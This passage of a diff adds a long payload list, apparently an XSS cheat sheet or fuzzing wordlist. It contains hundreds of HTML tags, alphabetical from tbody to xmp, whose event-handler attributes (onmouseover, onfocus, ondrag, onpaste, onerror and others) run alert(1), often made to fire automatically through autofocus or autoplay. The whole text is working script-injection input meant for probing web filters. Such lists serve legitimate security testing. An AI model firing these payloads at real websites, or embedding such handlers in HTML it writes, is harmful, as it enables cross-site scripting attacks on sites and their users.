+<tbody onmouseover="alert(1)">test</tbody>
+<tbody onmouseup="alert(1)">test</tbody>
+<tbody onpaste="alert(1)" contenteditable>test</tbody>
+<td draggable="true" ondrag="alert(1)">test</td>
+<td draggable="true" ondragend="alert(1)">test</td>
+<td draggable="true" ondragenter="alert(1)">test</td>
+<td draggable="true" ondragleave="alert(1)">test</td>
+<td draggable="true" ondragstart="alert(1)">test</td>
+<td id=x tabindex=1 onactivate=alert(1)></td>
+<td id=x tabindex=1 onbeforeactivate=alert(1)></td>
+<td id=x tabindex=1 onbeforedeactivate=alert(1)></td><input autofocus>
+<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
+<td id=x tabindex=1 onfocus=alert(1)></td>
+<td id=x tabindex=1 onfocusin=alert(1)></td>
+<td onbeforecopy="alert(1)" contenteditable>test</td>
+<td onbeforecut="alert(1)" contenteditable>test</td>
+<td onbeforepaste="alert(1)" contenteditable>test</td>
+<td onblur=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onclick="alert(1)">test</td>
+<td oncontextmenu="alert(1)">test</td>
+<td oncopy="alert(1)" contenteditable>test</td>
+<td oncut="alert(1)" contenteditable>test</td>
+<td ondblclick="alert(1)">test</td>
+<td onfocusout=alert(1) tabindex=1 id=x></td><input autofocus>
+<td onkeydown="alert(1)" contenteditable>test</td>
+<td onkeypress="alert(1)" contenteditable>test</td>
+<td onkeyup="alert(1)" contenteditable>test</td>
+<td onmousedown="alert(1)">test</td>
+<td onmouseenter="alert(1)">test</td>
+<td onmouseleave="alert(1)">test</td>
+<td onmousemove="alert(1)">test</td>
+<td onmouseout="alert(1)">test</td>
+<td onmouseover="alert(1)">test</td>
+<td onmouseup="alert(1)">test</td>
+<td onpaste="alert(1)" contenteditable>test</td>
+<template draggable="true" ondrag="alert(1)">test</template>
+<template draggable="true" ondragend="alert(1)">test</template>
+<template draggable="true" ondragenter="alert(1)">test</template>
+<template draggable="true" ondragleave="alert(1)">test</template>
+<template draggable="true" ondragstart="alert(1)">test</template>
+<template id=x tabindex=1 onactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforeactivate=alert(1)></template>
+<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>
+<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
+<template id=x tabindex=1 onfocus=alert(1)></template>
+<template id=x tabindex=1 onfocusin=alert(1)></template>
+<template onbeforecopy="alert(1)" contenteditable>test</template>
+<template onbeforecut="alert(1)" contenteditable>test</template>
+<template onbeforepaste="alert(1)" contenteditable>test</template>
+<template onblur=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onclick="alert(1)">test</template>
+<template oncontextmenu="alert(1)">test</template>
+<template oncopy="alert(1)" contenteditable>test</template>
+<template oncut="alert(1)" contenteditable>test</template>
+<template ondblclick="alert(1)">test</template>
+<template onfocusout=alert(1) tabindex=1 id=x></template><input autofocus>
+<template onkeydown="alert(1)" contenteditable>test</template>
+<template onkeypress="alert(1)" contenteditable>test</template>
+<template onkeyup="alert(1)" contenteditable>test</template>
+<template onmousedown="alert(1)">test</template>
+<template onmouseenter="alert(1)">test</template>
+<template onmouseleave="alert(1)">test</template>
+<template onmousemove="alert(1)">test</template>
+<template onmouseout="alert(1)">test</template>
+<template onmouseover="alert(1)">test</template>
+<template onmouseup="alert(1)">test</template>
+<template onpaste="alert(1)" contenteditable>test</template>
+<textarea autofocus onfocus=alert(1)>test</textarea>
+<textarea autofocus onfocusin=alert(1)>test</textarea>
+<textarea draggable="true" ondrag="alert(1)">test</textarea>
+<textarea draggable="true" ondragend="alert(1)">test</textarea>
+<textarea draggable="true" ondragenter="alert(1)">test</textarea>
+<textarea draggable="true" ondragleave="alert(1)">test</textarea>
+<textarea draggable="true" ondragstart="alert(1)">test</textarea>
+<textarea id=x tabindex=1 onactivate=alert(1)></textarea>
+<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>
+<textarea id=x tabindex=1 onbeforedeactivate=alert(1)></textarea><input autofocus>
+<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>
+<textarea onauxclick=alert(1)>XSS</textarea>
+<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
+<textarea onbeforecut=alert(1) autofocus>XSS</textarea>
+<textarea onbeforepaste=alert(1) autofocus></textarea>
+<textarea onblur=alert(1) id=x></textarea><input autofocus>
+<textarea onchange=alert(1)>XSS</textarea>
+<textarea onclick="alert(1)">test</textarea>
+<textarea oncontextmenu="alert(1)">test</textarea>
+<textarea oncopy=alert(1) autofocus>XSS</textarea>
+<textarea oncut=alert(1) autofocus>XSS</textarea>
+<textarea ondblclick="alert(1)">test</textarea>
+<textarea onfocusout=alert(1) id=x></textarea><input autofocus>
+<textarea oninput=alert(1)>XSS</textarea>
+<textarea onkeydown="alert(1)" contenteditable>test</textarea>
+<textarea onkeypress="alert(1)" contenteditable>test</textarea>
+<textarea onkeyup="alert(1)" contenteditable>test</textarea>
+<textarea onmousedown="alert(1)">test</textarea>
+<textarea onmouseenter="alert(1)">test</textarea>
+<textarea onmouseleave="alert(1)">test</textarea>
+<textarea onmousemove="alert(1)">test</textarea>
+<textarea onmouseout="alert(1)">test</textarea>
+<textarea onmouseover="alert(1)">test</textarea>
+<textarea onmouseup="alert(1)">test</textarea>
+<textarea onpaste=alert(1) autofocus></textarea>
+<textarea onselect=alert(1) autofocus>XSS</textarea>
+<tfoot draggable="true" ondrag="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragend="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragenter="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragleave="alert(1)">test</tfoot>
+<tfoot draggable="true" ondragstart="alert(1)">test</tfoot>
+<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus>
+<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>
+<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
+<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
+<tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
+<tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
+<tfoot onbeforepaste="alert(1)" contenteditable>test</tfoot>
+<tfoot onblur=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<tfoot onclick="alert(1)">test</tfoot>
+<tfoot oncontextmenu="alert(1)">test</tfoot>
+<tfoot oncopy="alert(1)" contenteditable>test</tfoot>
+<tfoot oncut="alert(1)" contenteditable>test</tfoot>
+<tfoot ondblclick="alert(1)">test</tfoot>
+<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>
+<tfoot onkeydown="alert(1)" contenteditable>test</tfoot>
+<tfoot onkeypress="alert(1)" contenteditable>test</tfoot>
+<tfoot onkeyup="alert(1)" contenteditable>test</tfoot>
+<tfoot onmousedown="alert(1)">test</tfoot>
+<tfoot onmouseenter="alert(1)">test</tfoot>
+<tfoot onmouseleave="alert(1)">test</tfoot>
+<tfoot onmousemove="alert(1)">test</tfoot>
+<tfoot onmouseout="alert(1)">test</tfoot>
+<tfoot onmouseover="alert(1)">test</tfoot>
+<tfoot onmouseup="alert(1)">test</tfoot>
+<tfoot onpaste="alert(1)" contenteditable>test</tfoot>
+<th draggable="true" ondrag="alert(1)">test</th>
+<th draggable="true" ondragend="alert(1)">test</th>
+<th draggable="true" ondragenter="alert(1)">test</th>
+<th draggable="true" ondragleave="alert(1)">test</th>
+<th draggable="true" ondragstart="alert(1)">test</th>
+<th id=x tabindex=1 onactivate=alert(1)></th>
+<th id=x tabindex=1 onbeforeactivate=alert(1)></th>
+<th id=x tabindex=1 onbeforedeactivate=alert(1)></th><input autofocus>
+<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>
+<th id=x tabindex=1 onfocus=alert(1)></th>
+<th id=x tabindex=1 onfocusin=alert(1)></th>
+<th onbeforecopy="alert(1)" contenteditable>test</th>
+<th onbeforecut="alert(1)" contenteditable>test</th>
+<th onbeforepaste="alert(1)" contenteditable>test</th>
+<th onblur=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onclick="alert(1)">test</th>
+<th oncontextmenu="alert(1)">test</th>
+<th oncopy="alert(1)" contenteditable>test</th>
+<th oncut="alert(1)" contenteditable>test</th>
+<th ondblclick="alert(1)">test</th>
+<th onfocusout=alert(1) tabindex=1 id=x></th><input autofocus>
+<th onkeydown="alert(1)" contenteditable>test</th>
+<th onkeypress="alert(1)" contenteditable>test</th>
+<th onkeyup="alert(1)" contenteditable>test</th>
+<th onmousedown="alert(1)">test</th>
+<th onmouseenter="alert(1)">test</th>
+<th onmouseleave="alert(1)">test</th>
+<th onmousemove="alert(1)">test</th>
+<th onmouseout="alert(1)">test</th>
+<th onmouseover="alert(1)">test</th>
+<th onmouseup="alert(1)">test</th>
+<th onpaste="alert(1)" contenteditable>test</th>
+<thead draggable="true" ondrag="alert(1)">test</thead>
+<thead draggable="true" ondragend="alert(1)">test</thead>
+<thead draggable="true" ondragenter="alert(1)">test</thead>
+<thead draggable="true" ondragleave="alert(1)">test</thead>
+<thead draggable="true" ondragstart="alert(1)">test</thead>
+<thead id=x tabindex=1 onactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>
+<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>
+<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
+<thead id=x tabindex=1 onfocus=alert(1)></thead>
+<thead id=x tabindex=1 onfocusin=alert(1)></thead>
+<thead onbeforecopy="alert(1)" contenteditable>test</thead>
+<thead onbeforecut="alert(1)" contenteditable>test</thead>
+<thead onbeforepaste="alert(1)" contenteditable>test</thead>
+<thead onblur=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onclick="alert(1)">test</thead>
+<thead oncontextmenu="alert(1)">test</thead>
+<thead oncopy="alert(1)" contenteditable>test</thead>
+<thead oncut="alert(1)" contenteditable>test</thead>
+<thead ondblclick="alert(1)">test</thead>
+<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>
+<thead onkeydown="alert(1)" contenteditable>test</thead>
+<thead onkeypress="alert(1)" contenteditable>test</thead>
+<thead onkeyup="alert(1)" contenteditable>test</thead>
+<thead onmousedown="alert(1)">test</thead>
+<thead onmouseenter="alert(1)">test</thead>
+<thead onmouseleave="alert(1)">test</thead>
+<thead onmousemove="alert(1)">test</thead>
+<thead onmouseout="alert(1)">test</thead>
+<thead onmouseover="alert(1)">test</thead>
+<thead onmouseup="alert(1)">test</thead>
+<thead onpaste="alert(1)" contenteditable>test</thead>
+<time draggable="true" ondrag="alert(1)">test</time>
+<time draggable="true" ondragend="alert(1)">test</time>
+<time draggable="true" ondragenter="alert(1)">test</time>
+<time draggable="true" ondragleave="alert(1)">test</time>
+<time draggable="true" ondragstart="alert(1)">test</time>
+<time id=x tabindex=1 onactivate=alert(1)></time>
+<time id=x tabindex=1 onbeforeactivate=alert(1)></time>
+<time id=x tabindex=1 onbeforedeactivate=alert(1)></time><input autofocus>
+<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>
+<time id=x tabindex=1 onfocus=alert(1)></time>
+<time id=x tabindex=1 onfocusin=alert(1)></time>
+<time onbeforecopy="alert(1)" contenteditable>test</time>
+<time onbeforecut="alert(1)" contenteditable>test</time>
+<time onbeforepaste="alert(1)" contenteditable>test</time>
+<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>
+<time onclick="alert(1)">test</time>
+<time oncontextmenu="alert(1)">test</time>
+<time oncopy="alert(1)" contenteditable>test</time>
+<time oncut="alert(1)" contenteditable>test</time>
+<time ondblclick="alert(1)">test</time>
+<time onfocusout=alert(1) tabindex=1 id=x></time><input autofocus>
+<time onkeydown="alert(1)" contenteditable>test</time>
+<time onkeypress="alert(1)" contenteditable>test</time>
+<time onkeyup="alert(1)" contenteditable>test</time>
+<time onmousedown="alert(1)">test</time>
+<time onmouseenter="alert(1)">test</time>
+<time onmouseleave="alert(1)">test</time>
+<time onmousemove="alert(1)">test</time>
+<time onmouseout="alert(1)">test</time>
+<time onmouseover="alert(1)">test</time>
+<time onmouseup="alert(1)">test</time>
+<time onpaste="alert(1)" contenteditable>test</time>
+<title draggable="true" ondrag="alert(1)">test</title>
+<title draggable="true" ondragend="alert(1)">test</title>
+<title draggable="true" ondragenter="alert(1)">test</title>
+<title draggable="true" ondragleave="alert(1)">test</title>
+<title draggable="true" ondragstart="alert(1)">test</title>
+<title id=x tabindex=1 onactivate=alert(1)></title>
+<title id=x tabindex=1 onbeforeactivate=alert(1)></title>
+<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>
+<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>
+<title id=x tabindex=1 onfocus=alert(1)></title>
+<title id=x tabindex=1 onfocusin=alert(1)></title>
+<title onbeforecopy="alert(1)" contenteditable>test</title>
+<title onbeforecut="alert(1)" contenteditable>test</title>
+<title onbeforepaste="alert(1)" contenteditable>test</title>
+<title onblur=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onclick="alert(1)">test</title>
+<title oncontextmenu="alert(1)">test</title>
+<title oncopy="alert(1)" contenteditable>test</title>
+<title oncut="alert(1)" contenteditable>test</title>
+<title ondblclick="alert(1)">test</title>
+<title onfocusout=alert(1) tabindex=1 id=x></title><input autofocus>
+<title onkeydown="alert(1)" contenteditable>test</title>
+<title onkeypress="alert(1)" contenteditable>test</title>
+<title onkeyup="alert(1)" contenteditable>test</title>
+<title onmousedown="alert(1)">test</title>
+<title onmouseenter="alert(1)">test</title>
+<title onmouseleave="alert(1)">test</title>
+<title onmousemove="alert(1)">test</title>
+<title onmouseout="alert(1)">test</title>
+<title onmouseover="alert(1)">test</title>
+<title onmouseup="alert(1)">test</title>
+<title onpaste="alert(1)" contenteditable>test</title>
+<tr draggable="true" ondrag="alert(1)">test</tr>
+<tr draggable="true" ondragend="alert(1)">test</tr>
+<tr draggable="true" ondragenter="alert(1)">test</tr>
+<tr draggable="true" ondragleave="alert(1)">test</tr>
+<tr draggable="true" ondragstart="alert(1)">test</tr>
+<tr id=x tabindex=1 onactivate=alert(1)></tr>
+<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>
+<tr id=x tabindex=1 onbeforedeactivate=alert(1)></tr><input autofocus>
+<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>
+<tr id=x tabindex=1 onfocus=alert(1)></tr>
+<tr id=x tabindex=1 onfocusin=alert(1)></tr>
+<tr onbeforecopy="alert(1)" contenteditable>test</tr>
+<tr onbeforecut="alert(1)" contenteditable>test</tr>
+<tr onbeforepaste="alert(1)" contenteditable>test</tr>
+<tr onblur=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onclick="alert(1)">test</tr>
+<tr oncontextmenu="alert(1)">test</tr>
+<tr oncopy="alert(1)" contenteditable>test</tr>
+<tr oncut="alert(1)" contenteditable>test</tr>
+<tr ondblclick="alert(1)">test</tr>
+<tr onfocusout=alert(1) tabindex=1 id=x></tr><input autofocus>
+<tr onkeydown="alert(1)" contenteditable>test</tr>
+<tr onkeypress="alert(1)" contenteditable>test</tr>
+<tr onkeyup="alert(1)" contenteditable>test</tr>
+<tr onmousedown="alert(1)">test</tr>
+<tr onmouseenter="alert(1)">test</tr>
+<tr onmouseleave="alert(1)">test</tr>
+<tr onmousemove="alert(1)">test</tr>
+<tr onmouseout="alert(1)">test</tr>
+<tr onmouseover="alert(1)">test</tr>
+<tr onmouseup="alert(1)">test</tr>
+<tr onpaste="alert(1)" contenteditable>test</tr>
+<track draggable="true" ondrag="alert(1)">test</track>
+<track draggable="true" ondragend="alert(1)">test</track>
+<track draggable="true" ondragenter="alert(1)">test</track>
+<track draggable="true" ondragleave="alert(1)">test</track>
+<track draggable="true" ondragstart="alert(1)">test</track>
+<track id=x tabindex=1 onactivate=alert(1)></track>
+<track id=x tabindex=1 onbeforeactivate=alert(1)></track>
+<track id=x tabindex=1 onbeforedeactivate=alert(1)></track><input autofocus>
+<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>
+<track id=x tabindex=1 onfocus=alert(1)></track>
+<track id=x tabindex=1 onfocusin=alert(1)></track>
+<track onbeforecopy="alert(1)" contenteditable>test</track>
+<track onbeforecut="alert(1)" contenteditable>test</track>
+<track onbeforepaste="alert(1)" contenteditable>test</track>
+<track onblur=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onclick="alert(1)">test</track>
+<track oncontextmenu="alert(1)">test</track>
+<track oncopy="alert(1)" contenteditable>test</track>
+<track oncut="alert(1)" contenteditable>test</track>
+<track ondblclick="alert(1)">test</track>
+<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>
+<track onkeydown="alert(1)" contenteditable>test</track>
+<track onkeypress="alert(1)" contenteditable>test</track>
+<track onkeyup="alert(1)" contenteditable>test</track>
+<track onmousedown="alert(1)">test</track>
+<track onmouseenter="alert(1)">test</track>
+<track onmouseleave="alert(1)">test</track>
+<track onmousemove="alert(1)">test</track>
+<track onmouseout="alert(1)">test</track>
+<track onmouseover="alert(1)">test</track>
+<track onmouseup="alert(1)">test</track>
+<track onpaste="alert(1)" contenteditable>test</track>
+<tt draggable="true" ondrag="alert(1)">test</tt>
+<tt draggable="true" ondragend="alert(1)">test</tt>
+<tt draggable="true" ondragenter="alert(1)">test</tt>
+<tt draggable="true" ondragleave="alert(1)">test</tt>
+<tt draggable="true" ondragstart="alert(1)">test</tt>
+<tt id=x tabindex=1 onactivate=alert(1)></tt>
+<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>
+<tt id=x tabindex=1 onbeforedeactivate=alert(1)></tt><input autofocus>
+<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>
+<tt id=x tabindex=1 onfocus=alert(1)></tt>
+<tt id=x tabindex=1 onfocusin=alert(1)></tt>
+<tt onbeforecopy="alert(1)" contenteditable>test</tt>
+<tt onbeforecut="alert(1)" contenteditable>test</tt>
+<tt onbeforepaste="alert(1)" contenteditable>test</tt>
+<tt onblur=alert(1) tabindex=1 id=x></tt><input autofocus>
+<tt onclick="alert(1)">test</tt>
+<tt oncontextmenu="alert(1)">test</tt>
+<tt oncopy="alert(1)" contenteditable>test</tt>
+<tt oncut="alert(1)" contenteditable>test</tt>
+<tt ondblclick="alert(1)">test</tt>
+<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>
+<tt onkeydown="alert(1)" contenteditable>test</tt>
+<tt onkeypress="alert(1)" contenteditable>test</tt>
+<tt onkeyup="alert(1)" contenteditable>test</tt>
+<tt onmousedown="alert(1)">test</tt>
+<tt onmouseenter="alert(1)">test</tt>
+<tt onmouseleave="alert(1)">test</tt>
+<tt onmousemove="alert(1)">test</tt>
+<tt onmouseout="alert(1)">test</tt>
+<tt onmouseover="alert(1)">test</tt>
+<tt onmouseup="alert(1)">test</tt>
+<tt onpaste="alert(1)" contenteditable>test</tt>
+<u draggable="true" ondrag="alert(1)">test</u>
+<u draggable="true" ondragend="alert(1)">test</u>
+<u draggable="true" ondragenter="alert(1)">test</u>
+<u draggable="true" ondragleave="alert(1)">test</u>
+<u draggable="true" ondragstart="alert(1)">test</u>
+<u id=x tabindex=1 onactivate=alert(1)></u>
+<u id=x tabindex=1 onbeforeactivate=alert(1)></u>
+<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>
+<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>
+<u id=x tabindex=1 onfocus=alert(1)></u>
+<u id=x tabindex=1 onfocusin=alert(1)></u>
+<u onbeforecopy="alert(1)" contenteditable>test</u>
+<u onbeforecut="alert(1)" contenteditable>test</u>
+<u onbeforepaste="alert(1)" contenteditable>test</u>
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onclick="alert(1)">test</u>
+<u oncontextmenu="alert(1)">test</u>
+<u oncopy="alert(1)" contenteditable>test</u>
+<u oncut="alert(1)" contenteditable>test</u>
+<u ondblclick="alert(1)">test</u>
+<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onkeydown="alert(1)" contenteditable>test</u>
+<u onkeypress="alert(1)" contenteditable>test</u>
+<u onkeyup="alert(1)" contenteditable>test</u>
+<u onmousedown="alert(1)">test</u>
+<u onmouseenter="alert(1)">test</u>
+<u onmouseleave="alert(1)">test</u>
+<u onmousemove="alert(1)">test</u>
+<u onmouseout="alert(1)">test</u>
+<u onmouseover="alert(1)">test</u>
+<u onmouseup="alert(1)">test</u>
+<u onpaste="alert(1)" contenteditable>test</u>
+<ul draggable="true" ondrag="alert(1)">test</ul>
+<ul draggable="true" ondragend="alert(1)">test</ul>
+<ul draggable="true" ondragenter="alert(1)">test</ul>
+<ul draggable="true" ondragleave="alert(1)">test</ul>
+<ul draggable="true" ondragstart="alert(1)">test</ul>
+<ul id=x tabindex=1 onactivate=alert(1)></ul>
+<ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>
+<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>
+<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>
+<ul id=x tabindex=1 onfocus=alert(1)></ul>
+<ul id=x tabindex=1 onfocusin=alert(1)></ul>
+<ul onbeforecopy="alert(1)" contenteditable>test</ul>
+<ul onbeforecut="alert(1)" contenteditable>test</ul>
+<ul onbeforepaste="alert(1)" contenteditable>test</ul>
+<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onclick="alert(1)">test</ul>
+<ul oncontextmenu="alert(1)">test</ul>
+<ul oncopy="alert(1)" contenteditable>test</ul>
+<ul oncut="alert(1)" contenteditable>test</ul>
+<ul ondblclick="alert(1)">test</ul>
+<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>
+<ul onkeydown="alert(1)" contenteditable>test</ul>
+<ul onkeypress="alert(1)" contenteditable>test</ul>
+<ul onkeyup="alert(1)" contenteditable>test</ul>
+<ul onmousedown="alert(1)">test</ul>
+<ul onmouseenter="alert(1)">test</ul>
+<ul onmouseleave="alert(1)">test</ul>
+<ul onmousemove="alert(1)">test</ul>
+<ul onmouseout="alert(1)">test</ul>
+<ul onmouseover="alert(1)">test</ul>
+<ul onmouseup="alert(1)">test</ul>
+<ul onpaste="alert(1)" contenteditable>test</ul>
+<var draggable="true" ondrag="alert(1)">test</var>
+<var draggable="true" ondragend="alert(1)">test</var>
+<var draggable="true" ondragenter="alert(1)">test</var>
+<var draggable="true" ondragleave="alert(1)">test</var>
+<var draggable="true" ondragstart="alert(1)">test</var>
+<var id=x tabindex=1 onactivate=alert(1)></var>
+<var id=x tabindex=1 onbeforeactivate=alert(1)></var>
+<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>
+<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
+<var id=x tabindex=1 onfocus=alert(1)></var>
+<var id=x tabindex=1 onfocusin=alert(1)></var>
+<var onbeforecopy="alert(1)" contenteditable>test</var>
+<var onbeforecut="alert(1)" contenteditable>test</var>
+<var onbeforepaste="alert(1)" contenteditable>test</var>
+<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>
+<var onclick="alert(1)">test</var>
+<var oncontextmenu="alert(1)">test</var>
+<var oncopy="alert(1)" contenteditable>test</var>
+<var oncut="alert(1)" contenteditable>test</var>
+<var ondblclick="alert(1)">test</var>
+<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>
+<var onkeydown="alert(1)" contenteditable>test</var>
+<var onkeypress="alert(1)" contenteditable>test</var>
+<var onkeyup="alert(1)" contenteditable>test</var>
+<var onmousedown="alert(1)">test</var>
+<var onmouseenter="alert(1)">test</var>
+<var onmouseleave="alert(1)">test</var>
+<var onmousemove="alert(1)">test</var>
+<var onmouseout="alert(1)">test</var>
+<var onmouseover="alert(1)">test</var>
+<var onmouseup="alert(1)">test</var>
+<var onpaste="alert(1)" contenteditable>test</var>
+<video autoplay controls onpause=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeked=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onseeking=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onvolumechange=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay controls onwaiting=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video autoplay onloadedmetadata=alert(1)> <source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video autoplay onplaying=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay onended=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video controls autoplay ontimeupdate=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video draggable="true" ondrag="alert(1)">test</video>
+<video draggable="true" ondragend="alert(1)">test</video>
+<video draggable="true" ondragenter="alert(1)">test</video>
+<video draggable="true" ondragleave="alert(1)">test</video>
+<video draggable="true" ondragstart="alert(1)">test</video>
+<video id=x controls onfocus=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x controls onfocusin=alert(1)><source src="validvideo.mp4" type=video/mp4></video>
+<video id=x tabindex=1 onactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
+<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>
+<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
+<video onbeforecopy="alert(1)" contenteditable>test</video>
+<video onbeforecut="alert(1)" contenteditable>test</video>
+<video onbeforepaste="alert(1)" contenteditable>test</video>
+<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>
+<video oncanplay=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onclick="alert(1)">test</video>
+<video oncontextmenu="alert(1)">test</video>
+<video oncopy="alert(1)" contenteditable>test</video>
+<video oncut="alert(1)" contenteditable>test</video>
+<video ondblclick="alert(1)">test</video>
+<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>
+<video onkeydown="alert(1)" contenteditable>test</video>
+<video onkeypress="alert(1)" contenteditable>test</video>
+<video onkeyup="alert(1)" contenteditable>test</video>
+<video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<video onmousedown="alert(1)">test</video>
+<video onmouseenter="alert(1)">test</video>
+<video onmouseleave="alert(1)">test</video>
+<video onmousemove="alert(1)">test</video>
+<video onmouseout="alert(1)">test</video>
+<video onmouseover="alert(1)">test</video>
+<video onmouseup="alert(1)">test</video>
+<video onpaste="alert(1)" contenteditable>test</video>
+<video src/onerror=alert(1)>
+<video><source onerror=alert(1) src=1></video>
+<video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
+<wbr draggable="true" ondrag="alert(1)">test</wbr>
+<wbr draggable="true" ondragend="alert(1)">test</wbr>
+<wbr draggable="true" ondragenter="alert(1)">test</wbr>
+<wbr draggable="true" ondragleave="alert(1)">test</wbr>
+<wbr draggable="true" ondragstart="alert(1)">test</wbr>
+<wbr id=x tabindex=1 onactivate=alert(1)></wbr>
+<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>
+<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>
+<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>
+<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
+<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
+<wbr onbeforecopy="alert(1)" contenteditable>test</wbr>
+<wbr onbeforecut="alert(1)" contenteditable>test</wbr>
+<wbr onbeforepaste="alert(1)" contenteditable>test</wbr>
+<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<wbr onclick="alert(1)">test</wbr>
+<wbr oncontextmenu="alert(1)">test</wbr>
+<wbr oncopy="alert(1)" contenteditable>test</wbr>
+<wbr oncut="alert(1)" contenteditable>test</wbr>
+<wbr ondblclick="alert(1)">test</wbr>
+<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>
+<wbr onkeydown="alert(1)" contenteditable>test</wbr>
+<wbr onkeypress="alert(1)" contenteditable>test</wbr>
+<wbr onkeyup="alert(1)" contenteditable>test</wbr>
+<wbr onmousedown="alert(1)">test</wbr>
+<wbr onmouseenter="alert(1)">test</wbr>
+<wbr onmouseleave="alert(1)">test</wbr>
+<wbr onmousemove="alert(1)">test</wbr>
+<wbr onmouseout="alert(1)">test</wbr>
+<wbr onmouseover="alert(1)">test</wbr>
+<wbr onmouseup="alert(1)">test</wbr>
+<wbr onpaste="alert(1)" contenteditable>test</wbr>
+<xmp draggable="true" ondrag="alert(1)">test</xmp>
+<xmp draggable="true" ondragend="alert(1)">test</xmp>
+<xmp draggable="true" ondragenter="alert(1)">test</xmp>
+<xmp draggable="true" ondragleave="alert(1)">test</xmp>
+<xmp draggable="true" ondragstart="alert(1)">test</xmp>
+<xmp id=x tabindex=1 onactivate=alert(1)></xmp>
+<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
+<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>
+<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
+<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
+<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
